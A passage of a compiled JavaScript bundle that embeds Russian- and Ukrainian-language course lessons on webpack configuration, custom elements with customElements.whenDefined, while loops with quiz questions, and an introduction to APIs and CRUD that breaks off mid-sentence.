дальнейшем^^\n\n![](https://lh4.googleusercontent.com/jWl0b6D9RUO5Xmi51lrJE0l63pAHk-RYJFK9b5WFh0WRoKePjL5OlkWd40yzRnGzIORy7kN0wkJRiM_kxykFfRJE7yU1soHiOBvAhsTcfYdaETJfamHOacUtPMR5raxqMtMGOtPIRFqqkb0)\n\nПри этом результирующий бандл **main.js** не минимизирован, что облегчает отладку приложения ( переход к строке с ошибкой )\n\n![](https://lh4.googleusercontent.com/ug6vfxniKfZP8CHRCCH6J3MrjMmmkInYejG-8ApUMOPQlHlKLpnEubIstwhRX0gLBx1HD797H-PjkRQMhkgcrVaiGFwOVHDFCWlywS8xoB5t1YLYReZZF7qkW4DrqRHuqKHpURWkrZsDQ4k)\n\n••![ico-20 bash] webpack --mode production••\n\n**Окончательная сборка**\n\nРезультирующий бандл будет минимизирован, сообщения об ошибках не будут выводиться в консоль\n\n________________________________________________________________________________________________\n\n## ![ico-30 hw] Упражнение 3\n\nОткройте файл  **_package.json_**  и добавьте в свойство **~scripts~** в настройки запуска ~webpack~ :\n\n◘◘![ico-20 file] package.json◘◘\n\n~~~js\n"scripts": {\n  "dev": "webpack --mode development",\n  "prod": "webpack --mode production"\n}\n~~~\n\n![](http://icecream.me/uploads/d2f7543e47891188282c5f21075ea5bd.png)\n\n\nТеперь запустите команду :\n\n••![ico-20 bash] npm run dev••\n\n![](https://lh3.googleusercontent.com/9Kw0fdiVv9zrVzwLuN9mgI_kTysz4yCDr_pz4DixW9p4EHJnAtuiYC2zjZ_Zua4hZNB9J_7mwNOsVS8BnCpsJs7MmSkxSALp431a-mnwUIog458xNgcAxmUALDz9ddZsAEqqIWRyt9V37Vg)\n\n••![ico-20 bash] npm run prod••\n\nТеперь соберите свое приложение для  production\n\nОбратите внимание, насколько сократился размер результирующего файла  main.js \n\n![](https://lh3.googleusercontent.com/y8ZDRi431GzQ2QJjKd5u8rm9NehAdfgq48K6jtahgt1NPWZ6YY_pp_Ut_HBcJ5alQ0Zp6kHNCBqnxTM9iq2cUncPrNVvKwA9i5NsBce78yhOfFWmOxrF9KmBeahFEbSum1Q2g-B07GLC3qo)\n'},55981:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='## ![ico-25 webpack] Упражнение 4\n\n### ![ico-20 webpack] Настройки  webpack\n\nПереименуем  папку ![ico-20 folder] ~src~\n\nПусть теперь она называется  ![ico-20 folder] **js**\n\nПереименуем также файл ![ico-20 file] ~index.js~\n\nПусть теперь он называется ![ico-20 file] **script.js**\n\nТеперь изменим настройки запуска webpack в файле  ~package.json~:\n\n◘◘![ico-20 file] package.json◘◘\n\n~~~js\n"scripts": {\n  "dev": "webpack --mode development ./js/script.js --output ./build/index.js --watch",\n  "build": "webpack --mode production ./js/script.js --output ./build/index.js --watch"\n}\n~~~\n\n![](https://lh4.googleusercontent.com/t3HMzsLvURk-jymxhIhITlzHUVfrkuS1UagnldLwLccys2iZH8rBOFWdLf16gh1UqinQ8gjibPgIlqkp5PvYtAaC0hBwA32nscUHScKfZGFdgiWJHwMOyP7NU70qhWGZF87lOjmc7TfY4L8)\n\nНе забудьте внести соответствующие изменения в файл ![ico-20 file] **_index.html_**\n\nРезультирующий бандл будет теперь в папке ![ico-20 folder] **build**\nи называться он будет ![ico-20 file] index.js\n\nИзменим значение атрибута _src_ тега  ~script~ соответствующим образом:\n\n![](https://lh4.googleusercontent.com/mzuMRK4yXEhLJ1AW0sBaSswsz35bNA9srOzeQQx0EjWI2xUK7zzeADS9SdFh7g2heeuuBAQLMQYNI4xvVuiVOak-GOMQ88SpmSYE4ERCcYvRtFxg8prqo1pOyl5vy-mDY__8weNvaQ-wXhw)\n\n______________________________________________________________________\n\n### ![ico-20 webpack] Сборка\n\nТеперь запускайте сборку приложения одной из команд:\n\n••![ico-20 bash] npm run dev••\n\nили\n\n••![ico-20 bash] npm run build••\n\n(мы заменили _prod_ на **_build_** в  ~package.json~)\n\nи открывайте ~index.html~  в браузере\n_______________________________________________________________________\n\n••![ico-20 bash] npm run dev --watch••\n\n^^Сейчас   webpack   находится в режиме наблюдения за нашими исходными файлами,^^\n^^потому что мы использовали опцию **~--watch~**^^\n\nДавайте внесем изменения в файл ![ico-20 file] **_script.js_**\n\n◘◘![ico-20 file] script.js◘◘\n\n~~~js\nimport promise from \'./promise.js\'\n\npromise.then(response => document.querySelector(\'.sampleClass\').innerText += response)\n\ndocument.body\n  .appendChild(document.createElement(\'img\')\n  .src = \'https://sites.google.com/site/eternalfallout/alienhead-detailed.jpg\'\n~~~\n\nПерезагрузите страницу в браузере, и вы увидите, \nчто  webpack автоматически собрал заново наше приложение, \nи внесенные нами изменения уже отображаются на странице ![ico-20 wink]\n\nТеперь можно удалить папку ![ico-20 folder] **_dist_**'},28079:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-70 webpack] Webpack\n\n**Webpack **создает граф зависимостей приложения\n\nКаждый модуль приложения может иметь зависимости - модули, необходимые для его нормальной работы\n\nМодули ( ES6 ) - это файлы с расширением js, содержащие код\n\n____________________________________________________________________\n\n![ico-25 bash] **Установка**\n\nПакет  **webpack**  устанавливается с помощью **~npm~**\n\nКоманда\n\n••![ico-20 bash] npm install -g webpack webpack-cli••\n\nустановит  ~webpack~ и  ~webpack-cli~  глобально \n\n^^Сокращение для команды ~install ( i )~^^\n\n••![ico-20 bash] npm i webpack webpack-cli --save-dev••\n\nустановит  ~webpack~ и  ~webpack-cli~  в текущей папке\n\n![ico-20 warn] webpack-cli раньше по умолчанию устанавливался как часть самого **Webpack**\nТеперь вынесен в отдельный модуль, и его нужно устанавливать\nНужен, чтобы чтобы запускать сборку из командной строки или через менеджер пакетов\n\n_________________________________________________________________________\n\n![ico-25 webpack] **webpack.config.js**\n\nИз коробки webpack не потребует от вас использования файла конфигурации\n\nОднако при этом предполагается, что точкой входа вашего проекта является ~src/index.js~,\nа результат будет выведен в ~dist/main.js~, минимизированный и оптимизированный для производства\n\nОбычно проектам нужна расширенная функциональность\n\nдля этого нужно создать в корневой папке файл настроек ![ico-20 file] **~webpack.config.js~**, который будет по умолчанию использован webpack для конфигурирования сборки\n\n![ico-20 webpack] **--config**\n\nЕсли вы хотите использовать различные файлы конфигурации в зависимости от ситуации, это можно настроить с помощью флага ~--config~\n\nв командной строке:\n\n••![ico-20 bash] webpack --config prod.config.js••\n\n◘◘![ico-20 memo] package.json◘◘\n\n~~~js\n"scripts": {\n  "build": "webpack --config prod.config.js"\n}\n~~~\n\n_____________________________________________________________\n\n## ![ico-25 hw] Упражнение 1\n\n( zero-config )\n\nРаботаем в созданной ранее папке  _test_  ^^( вы можете назвать свою папку иначе )^^\n\nСоздаем файлы и папки:\n\n◘◘![ico-25 file] **index.html**◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html lang="ru">\n    &lt;head>\n        &lt;meta charset="UTF-8">\n        &lt;title>webpack-sample&lt;/title>\n    &lt;/head>\n    &lt;body>\n        &lt;div class = "sampleClass">&lt;/div>\n        &lt;script src = "./dist/main.js">&lt;/script>\n    &lt;/body>\n&lt;/html>\n~~~\n\n![ico-25 folder] **src**\n\nCоздайте папку  **src**  и поместите туда файл ![ico-20 file] **~index.js~**\n\n◘◘![ico-25 file] **index.js**◘◘\n\n~~~js\nconst promise = new Promise(function (resolve, reject) {\n  document.write(\'Wait, pease...<br>\')\n  setTimeout(() => resolve(\'OK, you are here ?\'), 2000)\n})\n\npromise.then(response => document.write(response))\n~~~\n\nа теперь выполните в консоли команду:\n\n••![ico-20 bash] webpack••\n\nwebpack был вызван нами без каких-либо параметров и опций\n\nВ консоли видно предупреждение, что опция  **~mode~** отсутствует,\nпоэтому использовано значение по умолчанию - **_~production~_**\n\n![](createPath("illustrations","webpack-1.png"))\n\nОбратите внимание, что в папке проекта появилась новая папка  ![ico-20 folder] **dist**,\n\nа в этой папке - минифицированный файл  ![ico-20 file] **_main.js_**\n\n![](https://lh6.googleusercontent.com/0pagIMHm51JuHbTPqLkRnHIEBD3WxdGhsLjsbb7h0faFhCO7cSVQc2gPhsLvisAFmqwymX0xhX2N4qYMH61DP8L7Aq-VesPwpso5WkBWpmT9WyDw9MU1QG1O7Glri7wN-sGxODtftnmxsOs)\n\nКак видите, мы обошлись без файла конфигурации, поскольку  Webpack 4  позволяет это _при условии использования дефолтных имен файлов и папок_:\n\n![ico-20 warn] Исходный файл должен находиться в папке ![ico-20 folder] **src** и называться ![ico-20 file] **_index.js_**\n\n![ico-20 warn] Результат сборки будет помещен в папку ![ico-20 folder] **dist** под именем  ![ico-20 file] **_main.js_**\n\nТеперь откройте файл  **_index.html_**  в браузере\n\n___________________________________________________________________________\n\n\n## ![ico-25 webpack] Опция --watch\n\nwebpack будет следить за изменениями в исходных файлах и оперативно пересобирать приложение при каждом обновлении\n\n••![ico-20 bash] webpack --watch --mode production••\n\n![](http://icecream.me/uploads/cef7b80e645edabc44cfd1d609bad0b4.png)\n\nВнесем изменения в файл **_index.js_**\nВ консоли видно, что вебпак автоматически пересобрал приложение\n\n![](http://icecream.me/uploads/4af9d3df11f420d5565f8ee17138ad81.png)\n\n______________________________________________________________'},938:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Custom elements\n\n## ![ico-25 icon] .whenDefined()\n\n![ico-20 warn] Возвращает промис\n\nПромис будет разрешен тогда, когда элемент, имя которого передано аргументом, будет определен с помощью метода ~customElements.define~\n\n_____________________\n\nИспользуя метод ~whenDefined~, можно избежать коллизий, связанных с тем, что элементы будут вставлены после того, как определение компонента состоялось\n\n^^хотя значительно проще это сделать с помощью _хуков жизненного цикла_ компонента^^\n\nЕсли в коде конструктора класса устанавливаются параметры компонента, которые должны быть переданы через атрибуты тега, то эти параметры не получат значений, потому что элементов еще нет и атрибуты, соответственно, отсутствуют\n\nРассмотрим простенький пример\n\n### ![ico-25 cap] Пример 1\n\nПусть наш веб-компонент будет таким:\n\n~~~js\nfunction defineCustomElement () {\n  class SampleElement extends HTMLElement {\n    constructor () {\n      super()\n      this.style.color = this.getAttribute('color')\n    }\n  }\n\n  customElements.define('sample-element', SampleElement)\n}\n~~~\n\nКод вставки кастомных элементов, для примера, будет таким:\n\n~~~js\nfinction insertCustomElements () {\n  for (const clr of ['red', 'green', 'blue']) {\n    const elem = document.body\n      .appendChild(document.createElement('sample-element'))\n    elem.innerHTML = '<h3>test</h3>'\n    elem.setAttribute('color', clr)\n  }\n}\n~~~\n\nИтак, у нас две функции\n\n• **~defineCustomElement~**\n• **~insertCustomElements~**\n\nПредположим, мы вызовем их в таком порядке:\n\n~~~js\ninsertCustomElements()\ndefineCustomElement()\n~~~\n\nи на странице будут окрашенные в разные цвета элементы\n\nЕсли же мы вызовем эти функции в другом порядке:\n\n~~~javascript\ndefineCustomElement()\ninsertCustomElements()\n~~~\n\nто текст всех элементов будут дефолтным (черным)\n\nЧтобы избежать таких коллизий, воспользуемся методом **~customElements.whenDefined~**:\n\n~~~js\nfunction defineCustomElement () {\n  class SampleElement extends HTMLElement {\n    constructor () {\n      super()\n      const shadow = this.attachShadow({ mode: 'closed' })\n      this.elem = shadow\n        .appendChild(document.createElement('h3'))\n      this.elem.innerText = 'test'\n    }\n\n    setStyle () {\n      this.elem.style.color = this.getAttribute('color')\n    }\n  }\n\n  customElements.define('sample-element', SampleElement)\n}\n\nfunction insertCustomElements () {\n  for (const clr of ['red', 'green', 'blue']) {\n    const elem = document.body\n      .appendChild(document.createElement('sample-element'))\n    elem.setAttribute('color', clr)\n\n    customElements.whenDefined('sample-element')\n      .then(() => elem.setStyle())\n  }\n}\n\ndefineCustomElement()\ninsertCustomElements()\n~~~\n\nТеперь элементы будут окрашиваться как надо независимо от порядка вызова функций **~defineCustomElement()~** и **~insertCustomElements()~**\n\n![ico-20 warn] Особенно важно это при асинхронной вставке кастомных элементов на страницу\n\n_____________________________________\n\n### ![ico-25 cap] Пример 2\n\nДалее в примерах мы будем использовать веб-компонент **~CircleElement~**\n\n\n~~~~js\nclass CircleElement extends HTMLElement {\n  constructor() {\n    super()\n    this.shadow = this.attachShadow({ mode: 'open' })\n    this.shadow.appendChild(document.createElement('div'))\n    this.shadowStyle = document.createElement('style')\n    this.shadow.appendChild(this.shadowStyle)\n    this.shadowStyle.textContent = ''\n    this.setStyle()\n  }\n\n  setStyle () {\n    this.shadowStyle.textContent = `\n      div {\n        width: ${ this.getAttribute('size') }px;\n        height: ${ this.getAttribute('size') }px;\n        border: inset 1px;\n        border-radius: 50%;\n        box-shadow: 3px 3px 5px #00000090;\n        background-color: ${ this.getAttribute('color') };\n      }\n      div:hover {\n        box-shadow: inset 3px 3px 5px #00000090;\n      }\n    `\n  }\n}\n\ncustomElements.define('circle-element', CircleElement)\n~~~~\n\nОбратите внимание, что у веб-компонента **~CircleElement~** определен метод **_~setStyle()~_**\n\nЭтот метод использует атрибуты **_~size~_** и **_~color~_**  кастомного элемента ~<circle-element>~,\nно мы не знаем, когда будут вставлены элементы ~<circle-element>~ в DOM\n\nТ.е. значения их атрибутов **_~size~_** и **_~color~_** могут быть еще не определены\n\n____________________________________________\n\nВ случае, если элементы уже заранее вставлены в разметке:\n\n[![ico-25 cap] Пример в песочнице](https://repl.it/@garevna/whenDefined-1)\n\n~~~html\n<body>\n  <circle-element size=\"150\" color=\"green\"></circle-element>\n  <circle-element size=\"100\" color=\"orange\"></circle-element>\n  <circle-element size=\"50\" color=\"blue\"></circle-element>\n</body>\n~~~\n\nи после этого определяется веб-компонент, проблем не возникнет -\n\nможно прямо в конструкторе класса **~CircleElement~** вызвать метод **_~setStyle()~_**\n\nНо если элементы будут вставлены после того, как отработал вышеприведенный код веб-компонента, нам придется для каждого элемента вызывать метод **_~setStyle()~_**\n\nЭто тоже не сложно, если мы точно знаем, что определение веб-компонента уже произошло к моменту вставки элементов\n\n~~~js\nconst collection = document.getElementsByTagName('circle-element')\nfor (const elem of collection) elem.setStyle()\n~~~\n\n_________________________\n\n![ico-25 warn] НО!\n\nЕсли мы не знаем, когда будут вставлены элементы, и что произойдет раньше - определение веб-компонента **~CircleElement~** или вставка кастомных элементов ~<circle-element>~ - возникнет проблема:\n\n• мы не можем обратиться к методу **_~setStyle()~_**, не будучи уверены в том, что такой метод уже определен ( т.е. веб-компонент уже объявлен );\n• мы не можем вызвать метод **_~setStyle()~_** в конструкторе компонента, поскольку не знаем, вставлены ли кастомные элементы на страницу и определены ли их атрибуты\n\n________________________________\n\n### ![ico-25 cap] Пример 3\n\nВ этом примере определение компонента происходит раньше, чем соответствующие кастомные элементы будут вставлены на страницу\n\nКогда вызывается метод ~setStyle()~, значения атрибутов **~size~** и **~color~** не определены\n\n~~~js\nclass CircleElement extends HTMLElement {\n  constructor() {\n    super()\n    this.shadow = this.attachShadow ( { mode: 'open' } )\n    this.shadow.appendChild(document.createElement('div'))\n    this.createStyle()\n    this.setStyle()\n  }\n  ...\n}\n\ncustomElements.define ( \"circle-element\", CircleElement )\n~~~\n\nПоэтому после вставки элементов на страницу\n\n~~~js\nfor (const x of ['blue', 'red', 'green', 'yellow']) {\n  const elem = document.body\n    .appendChild(document.createElement('circle-element'))\n    elem.setAttribute('color', x)\n    elem.setAttribute('size', Math.round(Math.random() * 200))\n}\n~~~\n\nони будут иметь вот такие значения атрибутов стиля:\n\n~~~console\n▼ #shadow-root (open)\n  <div></div>\n  <style>\n    div {\n      width: nullpx;\n      height: nullpx;\n      border: inset 1px;\n      border-radius: 50%;\n      box-shadow: 3px 3px 5px #00000090;\n      background-color: null;\n    }\n    div:hover {\n      box-shadow: inset 3px 3px 5px #00000090;\n    }\n  </style>\n~~~\n\nДобавим \"магическое заклинание\" при вставке элементов:\n\n~~~js\ncustomElements.whenDefined('circle-element')\n  .then(() => elem.setStyle())\n~~~\n\nи теперь кастомные элементы примут нормальный вид:\n\n~~~js\nfor (const x of ['blue', 'red', 'green', 'yellow']) {\n  const elem = document.body\n    .appendChild(document.createElement('circle-element'))\n  elem.setAttribute('color', x)\n  elem.setAttribute('size', Math.round(Math.random() * 200))\n\n  customElements.whenDefined('circle-element')\n    .then(() => elem.setStyle())\n}\n~~~\n\n___________________________________\n\n[![ico-25 cap]](https://garevna.github.io/js-samples/#22)\n\nАсинхронная вставка кастомных элементов\n\nРазбремся с ситуацией, когда кастомные элементы вставляются на страницу асинхронно\n\nПредположим, атрибуты кастомных элементов описаны в массиве:\n\n~~~js\nconst elems = [\n  {\n    size: Math.round(Math.random() * 200),\n    backColor: 'red'\n  },\n  {\n    size: Math.round(Math.random() * 200),\n    backColor: 'orange'\n  },\n  {\n    size: Math.round(Math.random() * 200),\n    backColor: 'yellow'\n  },\n  {\n    size: Math.round(Math.random() * 200),\n    backColor: 'green'\n  },\n  {\n    size: Math.round(Math.random() * 200),\n    backColor: 'blue'\n  }\n]\n~~~\n\nВставка кастомных элементов на страницу будет осуществляться с помощью асинхронного итератора\n\n~~~js\nelems.iterator = (async function * () {\n  ...\n}).call(elems)\n~~~\n\nОбратите внимание, что вызов асинхронной функции-генератора происходит\n\nс передачей ей контекста **~elems~**\n\n(методом ~call()~)\n\nВнутри асинхронной функции-генератора мы дополнительно объявим две вспомогательные функции:\n\n• addElem\n• promise\n\nОпишем их подробнее\n\nФункция **~addElem~**\n\n• получает в аргументах значения **_~size~_** и **_~color~_**\n• вставляет кастомный элемент на страницу и устанавливает ему атрибуты **_~size~_** и **_~color~_** ( используя полученные в аргументах значения )\n• возвращает ссылку на вставленный элемент\n\n~~~js\nconst addElem = (size, color) => {\n  const elem = document.body\n    .appendChild(document.createElement('circle-element'))\n    elem.setAttribute('color', color)\n    elem.setAttribute('size', size)\n    return elem\n}\n~~~\n\nФункция **~promise~**\n\n• получает значения **_~size~_** и **_~color~_**\n• возвращает промис, который асинхронно вызывает функцию **~addElem~** с полученными аргументами\n\n~~~js\nconst promise = (size, color) => new Promise(resolve => setTimeout(() => resolve(addElem(size, color)), Math.round(Math.random() * 5000)))\n~~~\n\nТеперь можно описать код самого асинхронного генератора\n\n(внутри функции-генератора ~this~ будет ссылкой на **~elems~**)\n\n~~~js\nlet len = this.length\nwhile (len --\x3e 0) {\n  const elem = await promise(this[len].size, this[len].backColor)\n  customElements.whenDefined('circle-element')\n    .then(() => elem.setStyle())\n  yield elem\n}\n~~~\n\nИтак, этот код итерирует ~this~ (т.е. **~elems~**)\n\n• на каждой итерации происходит вызов функции **~promise~**\n• перед вызовом **~promise~** стоит ключевое слово ~await~, т.е. в этом месте итератор дождется, когда **~promise~** вернет результат, и поместит этот результат в переменную **_~elem~_**\n• теперь, когда элемент создан и вставлен на страницу, можно вызывать метод ~customElements.whenDefined~\n• последнее - с помощью ключевого слова ~yield~ генератор говорит итератору вернуть **_~elem~_**\n\nТеперь можно собрать эти кусочки воедино и записать полный код создания итератора:\n\n~~~js\nelems.iterator = (async function * () {\n  const addElem = (size, color) => {\n    const elem = document.body\n      .appendChild(document.createElement('circle-element'))\n    elem.setAttribute('color', color)\n    elem.setAttribute('size', size)\n\n    return elem\n  }\n\n  const promise = (size, color) => new Promise(resolve => setTimeout(() => resolve(addElem(size, color)), Math.round(Math.random() * 5000)))\n\n  let len = this.length\n  while (len --\x3e 0) {\n    const elem = await promise(this[len].size, this[len].backColor)\n    customElements.whenDefined('circle-element')\n      .then(() => elem.setStyle())\n    yield elem\n  }\n}).call(elems)\n~~~\n\nОсталось совсем немного - вызов асинхронного итератора должен быть также асинхронным:\n\n~~~js\nasync function iterateElements () {\n  for (const item of elems) await elems.iterator.next()\n}\n\niterateElements ()\n~~~\n\nТеперь совершенно не важно, когда именно будет определен веб-компонент\n\nМетод ~customElements.whenDefined()~ гарантирует вызов метода **~setStyle()~** тогда, когда этот метод уже наверняка существует\n"},64649:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Циклы while и do...while\n\nОчень часто число итераций цикла заранее неизвестно, и оно зависит от выполнения некоего условия.\nКак в армейской поговорке, \"копать от забора и до обеда\".\n\nПоэтому мы не можем использовать счетчик итераций, поскольку не можем установить ограничение на его значение.\n\nВ этом случае мы используем один из операторов цикла **~while~** или **~do...while~**.\n\n## ![ico-30 icon] while\n\nСинтаксически оператор **~while~** включает три обязательные части: само слово **~while~**, затем (через пробел) круглые скобки, в которых будет записано логическое выражение (условие цикла), и затем (через пробел) - тело цикла, заключенное в фигурные скобки:\n\n~~~javascript\nwhile (условие) {\n  ...тело цикла\n}\n~~~\n\nЧто будет делать движок, столкнувшись с таким выражением?\n\n1. Сначала он вычислит значение логического выражения в круглых скобках и приведет его к логическому типу.\n2. Если условие выполнено (т.е. вычисленное значение будет ~true~), то выполняется код внутри фигурных скобок (очередная итерация цикла).\nПосле чего движок вернется к пункту 1.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar n = 5\n\nwhile (n < 5) {\n  console.log(n)\n}\n~~~\n\n^^Этот цикл не будет выполнен ни разу, поскольку условие ~n < 5~ не выполнено изначально, т.е. при вычислении выражения в круглых скобках будет получено значение ~false~.^^\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar res = 0, n = 1\n\nwhile (n) {\n  n = prompt('Enter the number')\n  res += (n - 0) || 0\n}\n~~~\n\n^^Цикл будет суммировать введенные юзером числа до тех пор, пока в модальном окне ~prompt~ не будет нажата кнопка ~Cancel~.^^\n^^Поскольку в модальном окне введенные значения будут строкового типа, мы приводим их к числу с помощью вычитания ~(n - 0)~.^^\n^^Если в результате вычитания ~(n - 0)~ будет получено значение ~NaN~, то к переменной ~res~ будет добавлен 0.^^\n\nВ следующем примере мы воспользуемся функцией **~random~** библиотеки **~Math~**, которая генерирует псевдо-случайное число от 0 до 1:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar res = 0, n = 0\n\nwhile (n < 0.5) {\n  n = Math.random()\n  res += n\n}\n~~~\n\nОчевидно, что этот цикл не будет бесконечным, поскольку рано или поздно значение **~Math.random()~** окажется больше 0.5.\n\n______________________\n\n## ![ico-30 icon] do...while\n\nЭтот цикл сначала выполняет код в фигурных скобках, а потом проверяет выполнение условия.\n\n~~~js\ndo {\n  ...\n} while (условие)\n~~~\n\n^^Цикл будет выполнен как минимум 1 раз, поскольку проверка истинности условия происходит после очередной итерации цикла.^^\n\nКогда этот цикл предпочтительнее предыдущего?\nНапример, в таком случае:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\ndo {\n  var rand = Math.random()\n  console.log(rand)\n} while (rand < .5)\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n~~~js\ndo {\n  var rand = Math.random()\n  if (rand > .5) break\n} while (true)\n~~~\n\n→→→ Будет ли цикл бесконечным? | 'yes', 'no' | no→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n~~~js\nvar num = 1\n\nwhile (Math.random() < .5) {\n  num *= (num + 1)\n}\n~~~\n\n→→→ Будет ли цикл бесконечным? | 'yes', 'no' | no→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 0\n\nwhile (true) {\n  num >= 2 && res++\n  num /= 2\n  if (num < 2) {\n    console.log(`2 ** ${res} = ${2 ** res}`)\n    break\n  }\n}\n~~~\n\n→→→ Что будет в консоли, если в модальном окне ввести 8? | '', '2 ** 1 = 2', '2 ** 2 = 4', '2 ** 3 = 8', '2 ** 4 = 16' | 2 ** 3 = 8→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 1\n\nwhile (true) {\n  res *= num--\n  if (num < 2) {\n    console.log(`Factorial: ${res}`)\n    break\n  }\n}\n~~~\n\n→→→ Что будет в консоли, если в модальном окне ввести 5? | 24, 0, 120, 20 | 120→→→\n\n________________\n\n[![ico-30 hw] **Quiz**](quiz/while)\n"},85195:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\n#![ico-70 warn] 303\n\nSee Other\n\n----------\n\nПриношу свої вибачення, переклад цієї теми в процесі.\nВи можете подивитися цю тему російською мовою, якщо вам це не дуже гидко.\n"},91163:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] API\n\n[** ♫**](sounds/ua/api.mp3)\n\n**_Application Programming Interface_** (**API**) дає змогу двом системам взаємодіяти одна з одною.\n\nПрипустімо, існує якийсь зовнішній щодо вашого додатка набір сервісів, які значно розширюють функціональність вашого додатка.\nЯкщо існує якийсь програмний інтерфейс, що забезпечує вам доступ до цих сервісів, то це і є **API**.\nТобто вам не потрібно включати ці сервіси у свій застосунок, вам не важливо, якою мовою вони написані, вам важливо тільки знати, яким способом їх активувати.\n\n![ico-20 pin] Працюючи на клієнті, ваш код постійно використовує браузерні API<br>(наприклад, ~DOM API~, ~Audio API~, ~Fetch API~, ~File API~, ~Notification API~, ~IndexedDB API~).\n![ico-20 pin] До багатьох веб-API ви можете підключитися віддалено<br>(наприклад, [![ico-70 firebase]](https://firebase.google.com/) або [![ico-35 google-maps]](https://developers.google.com/maps/documentation/javascript/)).\n\n## ![ico-25 icon] CRUD\n\n[** ♫**](sounds/ua/api-crud.mp3)\n\nЯк правило, будь-який додаток взаємодіє зі своїм бекенд-апі, розташованим на сервері.\nБекенд-апі забезпечує додатку доступ до даних, які зберігаються на сервері, за допомогою методів **CRUD**.\nПри цьому вас абсолютно не стосується, як саме дані зберігаються на сервері: у вигляді окремих файлів, або у вигляді записів у базі даних.\n\n^^^[CRUD]\n\n**CRUD** (_create_, _read_, _update_, _delete_) — це чотири основних типи запитів до сервера.\n\nДля ідентифікації типу запиту використовується **метод доступу**, або **дієслово**, яке ідентифікує операцію з ресурсом.\n\n| **GET** | **POST** | **PUT** | **PATCH** | **DELETE** | **HEAD** |\n\n| ~read~   | **GET**    | отримати дані                                |\n| ~create~ | **POST**   | створення нового ресурсу (нового запису)     |\n| ~update~ | **PUT**    | повне оновлення наявного ресурсу (запису)    |\n| ~update~ | **PATCH**  | часткове оновлення наявного ресурсу (запису) |\n| ~delete~ | **DELETE** | видалення ресурсу                            |\n| ~read~   | **HEAD**   | отримання інформації про ресурс              |\n\n^^^\n\n### ![ico-25 icon] Resource\n\n[** ♫**](sounds/ua/api-resource.mp3)\n\n^^^[ресурс]\n\nГоловне під час взаємодії з серверним API - визначити зміст поняття "ресурс" і присвоїти кожному ресурсу унікальний ідентифікатор.\n^^Наприклад, як ресурс може виступати інформація про користувача. Знаючи унікальний ідентифікатор юзера, ви можете надіслати запит серверному API на отримання даних юзера (**GET**), на зміну даних юзера (**PUT** або **PATCH**), на створення нового юзера (**POST**).^^\n\nТаким чином, під час взаємодії з віддаленим API під терміном "ресурс" ми маємо на увазі якийсь **фрагмент інформації, що має унікальний ідентифікатор.**\n\nРізниця між **~URL~** (~Uniform Resource Locator~) і **~URI~** (~Uniform Resource Identifier~) полягає якраз у тому, що **~URL~** вказує точне місце розташування ресурсу на сервері, а **~URI~** вказує тільки ідентифікатор ресурсу, що забезпечує більшу гнучкість серверного API в плані розміщення даних і форми їх зберігання.\n\nНаприклад, на сервері може зберігатися файл зображення, але те саме зображення може зберігатися в базі даних у вигляді текстового рядка у форматі [**Base64**](https://www.base64encode.org/).\n\n^^^\n\n________\n\n## ![ico-25 icon] Request & Response\n\n[** ♫**](sounds/ua/api-request-response.mp3)\n\nБудь-який API працює за принципом "запит" - "відповідь".\nВаш застосунок надсилає запит, і якщо запит валідний, то API надсилає застосунку відповідь.\n\nФорма запиту залежить від API.\nЦе може бути метод, наприклад, **~setTimeout~** або **~fetch~**.\nЦе може бути об\'єкт, властивості та методи якого забезпечують вам доступ до можливостей браузерного API. Усі об\'єкти **BOM** і **DOM** є елементами браузерного API.\nЦе може бути конструктор, за допомогою якого ви створюєте об\'єкти, що забезпечують вам доступ до можливостей браузерного API. Наприклад, конструктор **~XMLHttpRequest~** або конструктор **~FileReader~**.\n\nУ разі віддаленого API запит здійснюється через інтернет і набуває форми якоїсь веб-адреси, яка називається **~endpoint~** (точка доступу до віддаленого API).\n\n_____________________________________\n\n## ![ico-25 icon] API endpoints\n\n[** ♫**](sounds/ua/api-endpoints.mp3)\n\nКожен API має документацію та специфікації, які визначають спосіб передавання інформації.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-01.png)\n^^^\n\nAPI-інтерфейси можуть використовувати HTTP-запити для отримання інформації від веб-додатка або веб-сервера.\n\nУ разі REST API запит здійснюється через інтернет і набуває форми якоїсь веб-адреси, яка називається **~endpoint~** (точка доступу до віддаленого API).\n\n^^^[additional]\nПонятие "endpoint" используется не только в контексте REST API, но и в более широком смысле в сфере информационных технологий и сетевых взаимодействий.\n\n• В сетевых протоколах endpoint может обозначать любую конечную точку связи в сети, будь то IP-адрес и порт в TCP/IP, или конечная точка в маршрутизации сообщений.\n• В SOAP (Simple Object Access Protocol) API endpoint также обозначает URL-адрес, к которому отправляются SOAP-сообщения. Это похоже на REST API, но используется в других протоколах и форматах данных.\n• В GraphQL API endpoint представляет собой одну конечную точку, через которую клиент может запрашивать конкретные данные, используя сложные запросы.\n• В микросервисах endpoint может обозначать любую точку входа для взаимодействия с отдельным микросервисом. Каждый микросервис может иметь свои собственные endpoints для различных функциональностей.\n• В более широком смысле, endpoint может обозначать любую точку, через которую осуществляется доступ к ресурсу или службе, будь то внутри системы или между различными системами.\n^^^\n\n**~endpoint~** - це URI-подібний рядок, який вам надає API для віддаленого доступу до ресурсів.\n\nДавайте розберемося, що ж включає цей рядок.\n\nПочнемо з того, що сам **API** має **URL**, наприклад: https://api.example.com.\nІ цей **URL** буде обов\'язково присутній у кожному 